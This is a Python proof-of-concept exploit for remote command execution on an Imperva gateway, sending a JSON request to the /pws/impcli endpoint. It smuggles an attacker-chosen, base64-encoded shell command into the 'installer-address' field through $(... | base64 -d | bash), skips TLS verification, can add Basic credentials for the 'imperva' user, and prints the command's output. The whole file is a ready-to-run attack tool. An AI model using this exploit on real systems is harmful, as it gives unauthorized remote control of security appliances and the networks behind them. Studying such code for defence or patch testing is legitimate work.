#!/usr/bin/env python3

import argparse
import sys
import base64
import json
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

parser = argparse.ArgumentParser()
parser.add_argument("-t", metavar="target", help="Target hostname/IP address", type=str, required=True)
parser.add_argument("-p", metavar="password", help="Agent registration password for 'imperva' user", type=str, required=False)
parser.add_argument("cmd", help="Command to be executed on target", type=str)
args = parser.parse_args()

# /pws/inception is another vulnerable endpoint
target_url = f"https://{args.t}/pws/impcli"
session = requests.Session()
session.get(target_url, verify=False)

split_mark = "SPLIT_MARK"
payload = f"$(printf {base64.b64encode(args.cmd.encode()).decode()} | base64 -d | bash)"
headers = {}
if args.p is not None:
    headers["Authorization"] = "Basic " + base64.b64encode(f"imperva:{args.p}".encode()).decode()

body = {
    "command": "impctl server status",
    "parameters": {
        "broadcast": True,
        "installer-address": f"127.0.0.1 {split_mark}{payload}{split_mark}"
    }
}

print(f"[*] Sending payload to {target_url}...")
response = session.post(target_url, headers=headers, data=json.dumps(body), verify=False)

if split_mark in response.text:
    print("[*] Received command execution output:")
    print(response.text.split(split_mark)[1])
elif response.status_code == requests.codes.unauthorized:
    print("[!] Gateway Authentication required, please provide agent registration password.")
else:
    print("[!] Failed to execute command on target.")
